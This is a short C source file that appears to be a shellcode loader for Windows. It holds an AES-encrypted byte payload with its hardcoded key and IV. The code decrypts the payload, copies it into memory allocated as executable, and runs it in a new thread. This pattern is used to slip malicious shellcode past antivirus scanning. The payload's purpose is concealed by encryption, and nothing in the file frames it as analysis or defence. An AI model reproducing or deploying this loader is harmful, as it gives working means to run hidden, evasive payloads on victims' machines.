#include "aes.h"
#include "Decryptshell.h"

unsigned char shl[] = "\x67\xe3\x4d\x2b\x44\xb8\xea\x00\x0b\x36\xb2\xf5\x0b\x15\x54\x94\x21\xbe\x1b\xa5\xf2\x66\x83\x52\x80\x5b\xa6\x88\x4c\x16\x64\x7d\xc5\x7a\x77\xd0\x79\x78\x39\x2b\xf8\x1f\xf0\x14\x8c\x27\xd1\xc7\xa1\x87\xe9\x43\x43\x36\x4d\x35\x45\x0c\xc5\x63\xb6\x37\x31\xd5\x32\x62\xf2\xd0\x69\x15\x97\xc1\xd8\xf5\x14\x62\xa2\xce\x4e\xc3\x46\x20\x64\x80\x1c\xa2\x4b\x94\x6d\x25\x58\x80\x37\x61\xdd\xdb\xf4\xde\xb2\xfd\xa9\x65\xb8\xc2\x9a\xae\x38\x42\xbd\x6e\x52\x30\x16\xed\x31\xa2\x1c\xa5\x5c\x23\x44\x76\x8e\x8c\x9d\xa3\xa0\x42\xdb\x50\x0b\x81\x38\xea\x38\x7b\xc0\x27\xf5\x9a\xa7\x7f\x2e\x57\x41\xc4\x79\x76\x27\x53\x3d\x22\x72\x0b\xcd\x23\x64\x33\x3e\x8f\xa6\x37\x83\xb5\x4f\x69\x29\x6f\x61\x68\x09\xd3\x4b\x7c\x8d\x79\x78\x11\x44\xc9\x25\x6c\xf5\x9d\x89\x0d\xca\xd4\x82\x3e\x7d\xe9\xa7\xa7\xdc\xe8\x30\x9e\xd5\x87\x68\x4b\x48\x88\x92\x91\x07\xca\x17\xe1\x89\x9e\x76\x3a\x5c\x2f\x52\x2f\x43\x50\x94\xc9\xab\x3a\x7d\xac\x36\xc0\xd7\x04\x8c\xe4\x7f\xcc\xc7\xa8\x2e\xd4\xb4\xb6\xa9\x8f\xd8\x42\x31\x2b\xe6\x41\xce\x47\xc3\xa2\x91\xb7\xda\x4d\xe9\x3b\xbd\x5b\x91\x0b\xee\x01\x87\x42\x84\xa5\x2b\x64\x4c\x10\x8b\xdb\xae\x9c\xc9\xe2\x52\x36\x70\xe6\x4c\x88\xc1\xee\x54\x3d\xfd\xa5\x7d\xac\x2d\xdd\x8b\x59\x2d\x81\x42\xda\x92\xf4\xa9\x2a\xf4\x71\xed\x0d\x52\x42\x0b\xbb\x4a\xf7\xf7\x0e\x71\xba\xd0\x20\xc1\xf0\x7d\x93\xbc\x73\x03\x8a\x03\x07\x71\x36\xa5\xd7\x3c\x46\x0b\x2c\x9b\x68\xa6\x36\xea\x7a\xa4\xa7\x05\x74\xdf\x67\xee\x8a\x14\x95\x29\xc4\xc7\x61\xc5\x1e\x12\x32\xb6\xb0\xaf\x91\x77\x21\x49\x66\x91\x92\x85\x43\x2b\xac\xa8\x7c\x7c\xec\x3f\xb7\x6c\xb8\x98\x76\xdd\x3f\x37\x7f\xaa\x52\x33\x84\x8c\x30\x68\x53\x35\xab\x77\xf8\x9e\x1a\xe2\x8e\xfd\xb6\xaa\x70\xb4\xe5\x53\x98\x4f\x97\x3a\x0d\xb5\x44\x92\x4e\xc7\x00\x20\x79\x80\x78\xba\xc8\x8b\xd5\x85\x17\x7b\xc0\x14\x81\x32\x96\x40\x0b\x4d\x8c\xfa\x36\xa3\x50\xb7\x5d\xca\x08\x3a\xa6\xea\x32\xd9\xce\x50\xf5\x1e\x20\x09\x4f\xd7\x56\xa2\xe8\x3f\x13\xb2\x26\x0d\x89\x75\xd2\x35\xc3\xfb\x8e\x94\xa2\x3a\xa7\xa6\x5a\xe7\x28\xc0\x87\x6f\x25\xb7\x64\xf2\x8f\x6f\xa7\x56\xcb\x0f\x52\xe4\xbb\x30\x11\x73\x5c\x21\x7e\x11\x3c";

int main() {

	int shlSize = sizeof(shl) - 1;

	struct AES_ctx ctx;
	unsigned char *iv = "\x29\x23\xbe\x84\xe1\x6c\xd6\xae\x52\x90\x49\xf1\xf1\xbb\xe9\xeb";
	unsigned char* key = "\xb3\xa6\xdb\x3c\x87\x0c\x3e\x99\x24\x5e\x0d\x1c\x06\xb7\x47\xde\xb3\x12\x4d\xc8\x43\xbb\x8b\xa6\x1f\x03\x5a\x7d\x09\x38\x25\x1f";

	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, shl, shlSize);

	LPVOID shlAlloc = VirtualAlloc(0, shlSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shlAlloc, shl, shlSize);
	HANDLE thrd = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shlAlloc, NULL, 0, NULL);
	WaitForSingleObject(thrd, INFINITE);

}


